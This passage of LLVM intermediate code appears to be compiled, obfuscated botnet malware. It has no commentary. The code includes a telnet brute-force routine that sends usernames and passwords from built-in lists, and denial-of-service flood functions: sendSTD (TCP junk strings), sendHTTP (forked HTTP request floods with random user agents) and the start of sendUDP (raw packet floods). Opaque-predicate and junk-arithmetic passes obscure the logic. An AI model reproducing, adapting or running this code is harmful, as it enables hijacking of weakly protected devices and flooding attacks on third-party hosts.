  %1162 = urem i32 %1161, 2
  %1163 = icmp eq i32 %1162, 0
  %1164 = icmp slt i32 %1159, 10
  %1165 = or i1 %1163, %1164
  br i1 %1165, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1157
  %1166 = load i32, i32* @x.79
  %1167 = load i32, i32* @y.80
  %1168 = sub i32 %1166, 1
  %1169 = mul i32 %1166, %1168
  %1170 = urem i32 %1169, 2
  %1171 = icmp eq i32 %1170, 0
  %1172 = icmp slt i32 %1167, 10
  %1173 = or i1 %1171, %1172
  br i1 %1173, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %42
  %1174 = load i32, i32* %5, align 4
  %1175 = load i32, i32* %11, align 4
  %1176 = icmp slt i32 %1174, %1175
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %102
  %1177 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1178 = load i32, i32* %5, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 7
  store i32 %1177, i32* %1181, align 16
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %159
  %1182 = load i32, i32* %5, align 4
  %1183 = sext i32 %1182 to i64
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 3
  %1186 = load i8, i8* %1185, align 1
  %1187 = zext i8 %1186 to i32
  %1188 = icmp eq i32 %1187, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %247
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %264
  %1189 = load i32, i32* %5, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 0
  %1193 = load i32, i32* %1192, align 16
  %1194 = load i32, i32* %5, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 0
  %1198 = load i32, i32* %1197, align 16
  %1199 = call i32 (i32, i32, ...) @fcntl(i32 %1198, i32 3, i8* null)
  %_ = shl i32 %1199, 2048
  %_15 = shl i32 %1199, 2048
  %_16 = shl i32 %1199, 2048
  %_17 = sub i32 %1199, 2048
  %gen = mul i32 %_17, 2048
  %_18 = sub i32 %1199, 2048
  %gen19 = mul i32 %_18, 2048
  %_20 = shl i32 %1199, 2048
  %_21 = shl i32 %1199, 2048
  %1200 = or i32 %1199, 2048
  %1201 = call i32 (i32, i32, ...) @fcntl(i32 %1193, i32 4, i32 %1200)
  %1202 = load i32, i32* %5, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 0
  %1206 = load i32, i32* %1205, align 16
  %1207 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %1208 = call i32 @connect(i32 %1206, %struct.sockaddr* %1207, i32 16)
  %1209 = icmp eq i32 %1208, -1
  br label %originalBB14

originalBB25alteredBB:                            ; preds = %originalBB25, %325
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %385
  %1210 = load i32, i32* %5, align 4
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1211
  call void @reset_telstate(%struct.telstate_t* %1212)
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %440
  %1213 = load i32, i32* %5, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1214
  call void @reset_telstate(%struct.telstate_t* %1215)
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %460
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %508
  %1216 = load i32, i32* %5, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 7
  %1220 = load i32, i32* %1219, align 16
  %_42 = sub i32 0, %1220
  %gen43 = add i32 %_42, 7
  %_44 = sub i32 0, %1220
  %gen45 = add i32 %_44, 7
  %_46 = sub i32 %1220, 7
  %gen47 = mul i32 %_46, 7
  %_48 = sub i32 0, %1220
  %gen49 = add i32 %_48, 7
  %_50 = sub i32 0, %1220
  %gen51 = add i32 %_50, 7
  %1221 = add i32 %1220, 7
  %1222 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1223 = icmp ult i32 %1221, %1222
  br label %originalBB41

originalBB55alteredBB:                            ; preds = %originalBB55, %538
  %1224 = load i32, i32* %5, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 0
  %1228 = load i32, i32* %1227, align 16
  %1229 = load i32, i32* %5, align 4
  %1230 = sext i32 %1229 to i64
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 4
  %1233 = load i8, i8* %1232, align 2
  %1234 = zext i8 %1233 to i64
  %1235 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %1234
  %1236 = load i8*, i8** %1235, align 8
  %1237 = load i32, i32* %5, align 4
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1238
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1239, i32 0, i32 4
  %1241 = load i8, i8* %1240, align 2
  %1242 = zext i8 %1241 to i64
  %1243 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %1242
  %1244 = load i8*, i8** %1243, align 8
  %1245 = call i64 @strlen(i8* %1244) #10
  %1246 = call i64 @send(i32 %1228, i8* %1236, i64 %1245, i32 16384)
  %1247 = icmp slt i64 %1246, 0
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %583
  %1248 = load i32, i32* %5, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 0
  %1252 = load i32, i32* %1251, align 16
  %1253 = call i64 @send(i32 %1252, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %1254 = icmp slt i64 %1253, 0
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %611
  %1255 = load i32, i32* %5, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1256
  call void @advance_state(%struct.telstate_t* %1257, i32 4)
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %631
  %1258 = load i32, i32* %5, align 4
  %1259 = sext i32 %1258 to i64
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 0
  %1262 = load i32, i32* %1261, align 16
  %1263 = load i32, i32* %3, align 4
  %1264 = load i32, i32* %5, align 4
  %1265 = sext i32 %1264 to i64
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1265
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1266, i32 0, i32 9
  %1268 = load i8*, i8** %1267, align 8
  %1269 = call i32 @read_until_response(i32 %1262, i32 %1263, i8* %1268, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %1270 = icmp ne i32 %1269, 0
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %661
  %1271 = load i32, i32* %5, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 9
  %1275 = load i8*, i8** %1274, align 8
  %1276 = call i32 @contains_fail(i8* %1275)
  %1277 = icmp ne i32 %1276, 0
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %693
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %724
  %1278 = load i32, i32* %5, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 0
  %1282 = load i32, i32* %1281, align 16
  %1283 = load i32, i32* %5, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 5
  %1287 = load i8, i8* %1286, align 1
  %1288 = zext i8 %1287 to i64
  %1289 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %1288
  %1290 = load i8*, i8** %1289, align 8
  %1291 = load i32, i32* %5, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 5
  %1295 = load i8, i8* %1294, align 1
  %1296 = zext i8 %1295 to i64
  %1297 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %1296
  %1298 = load i8*, i8** %1297, align 8
  %1299 = call i64 @strlen(i8* %1298) #10
  %1300 = call i64 @send(i32 %1282, i8* %1290, i64 %1299, i32 16384)
  %1301 = icmp slt i64 %1300, 0
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %765
  %1302 = load i32, i32* %5, align 4
  %1303 = sext i32 %1302 to i64
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1303
  call void @reset_telstate(%struct.telstate_t* %1304)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %785
  %1305 = load i32, i32* %5, align 4
  %1306 = sext i32 %1305 to i64
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1306
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1307, i32 0, i32 0
  %1309 = load i32, i32* %1308, align 16
  %1310 = call i64 @send(i32 %1309, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %1311 = icmp slt i64 %1310, 0
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %817
  %1312 = load i32, i32* %5, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 0
  %1316 = load i32, i32* %1315, align 16
  %1317 = load i32, i32* %3, align 4
  %1318 = load i32, i32* %5, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 9
  %1322 = load i8*, i8** %1321, align 8
  %1323 = call i32 @read_until_response(i32 %1316, i32 %1317, i8* %1322, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1324 = icmp ne i32 %1323, 0
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %910
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %931
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %949
  %1325 = load i32, i32* %5, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 7
  %1329 = load i32, i32* %1328, align 16
  %_104 = shl i32 %1329, 7
  %_105 = sub i32 %1329, 7
  %gen106 = mul i32 %_105, 7
  %_107 = sub i32 %1329, 7
  %gen108 = mul i32 %_107, 7
  %_109 = sub i32 0, %1329
  %gen110 = add i32 %_109, 7
  %_111 = sub i32 %1329, 7
  %gen112 = mul i32 %_111, 7
  %1330 = add i32 %1329, 7
  %1331 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1332 = icmp ult i32 %1330, %1331
  br label %originalBB103

originalBB116alteredBB:                           ; preds = %originalBB116, %974
  %1333 = load i32, i32* %5, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %1334
  call void @reset_telstate(%struct.telstate_t* %1335)
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %1008
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %1033
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %1087
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %1104
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %1121
  %1336 = load i32, i32* %5, align 4
  %_137 = sub i32 0, %1336
  %gen138 = add i32 %_137, 1
  %_139 = sub i32 %1336, 1
  %gen140 = mul i32 %_139, 1
  %1337 = add nsw i32 %1336, 1
  store i32 %1337, i32* %5, align 4
  br label %originalBB136

originalBB144alteredBB:                           ; preds = %originalBB144, %1140
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %1157
  br label %originalBB148
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %66, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 65, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = icmp sge i64 %56, %60
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %39
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = add nsw i32 %19, %20
  store i32 %21, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %22

; <label>:22:                                     ; preds = %originalBBpart29, %6
  %23 = load i32, i32* %14, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %115

; <label>:26:                                     ; preds = %22
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %28 = load i8*, i8** %7, align 8
  %29 = load i8*, i8** %10, align 8
  %30 = load i8*, i8** %8, align 8
  %31 = call i32 @rand() #2
  %32 = srem i32 %31, 36
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [789 x i8*], [789 x i8*]* @UserAgents, i64 0, i64 %33
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.387, i32 0, i32 0), i8* %28, i8* %29, i8* %30, i8* %35) #2
  %37 = call i32 @fork() #2
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %95

; <label>:39:                                     ; preds = %26
  %40 = load i32, i32* @x.83
  %41 = load i32, i32* @y.84
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i32, i32* @x.83
  %49 = load i32, i32* @y.84
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %56

; <label>:56:                                     ; preds = %93, %originalBBpart2
  %57 = load i32, i32* %15, align 4
  %58 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %59 = icmp sgt i32 %57, %58
  br i1 %59, label %60, label %94

; <label>:60:                                     ; preds = %56
  %61 = load i8*, i8** %8, align 8
  %62 = load i16, i16* %9, align 2
  %63 = call i32 @socket_connect(i8* %61, i16 zeroext %62)
  store i32 %63, i32* %13, align 4
  %64 = load i32, i32* %13, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %93

; <label>:66:                                     ; preds = %60
  %67 = load i32, i32* @x.83
  %68 = load i32, i32* @y.84
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* %13, align 4
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %77 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %78 = call i64 @strlen(i8* %77) #10
  %79 = call i64 @write(i32 %75, i8* %76, i64 %78)
  %80 = load i32, i32* %13, align 4
  %81 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %82 = call i64 @read(i32 %80, i8* %81, i64 1)
  %83 = load i32, i32* %13, align 4
  %84 = call i32 @close(i32 %83)
  %85 = load i32, i32* @x.83
  %86 = load i32, i32* @y.84
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %93

; <label>:93:                                     ; preds = %originalBBpart24, %60
  br label %56

; <label>:94:                                     ; preds = %56
  call void @exit(i32 0) #14
  unreachable

; <label>:95:                                     ; preds = %26
  br label %96

; <label>:96:                                     ; preds = %95
  %97 = load i32, i32* @x.83
  %98 = load i32, i32* @y.84
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i32, i32* %14, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  %107 = load i32, i32* @x.83
  %108 = load i32, i32* @y.84
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart29, label %originalBB6alteredBB

originalBBpart29:                                 ; preds = %originalBB6
  br label %22

; <label>:115:                                    ; preds = %22
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %39
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %116 = load i32, i32* %13, align 4
  %117 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %118 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %119 = call i64 @strlen(i8* %118) #10
  %120 = call i64 @write(i32 %116, i8* %117, i64 %119)
  %121 = load i32, i32* %13, align 4
  %122 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %123 = call i64 @read(i32 %121, i8* %122, i64 1)
  %124 = load i32, i32* %13, align 4
  %125 = call i32 @close(i32 %124)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %126 = load i32, i32* %14, align 4
  %_ = shl i32 %126, 1
  %_7 = sub i32 %126, 1
  %gen = mul i32 %_7, 1
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %14, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = load i32, i32* @x.85
  %10 = load i32, i32* @y.86
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  store i8* %0, i8** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 %7, i32* %24, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %18, align 4
  %44 = icmp eq i32 %43, 0
  %45 = load i32, i32* @x.85
  %46 = load i32, i32* @y.86
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %44, label %53, label %57

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %55, i16* %56, align 2
  br label %62

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i32, i32* %18, align 4
  %59 = trunc i32 %58 to i16
  %60 = call zeroext i16 @htons(i16 zeroext %59) #13
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %60, i16* %61, align 2
  br label %62

; <label>:62:                                     ; preds = %57, %53
  %63 = load i8*, i8** %17, align 8
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %65 = call i32 @getHost(i8* %63, %struct.in_addr* %64)
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %84

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* @x.85
  %69 = load i32, i32* @y.86
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* @x.85
  %77 = load i32, i32* @y.86
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
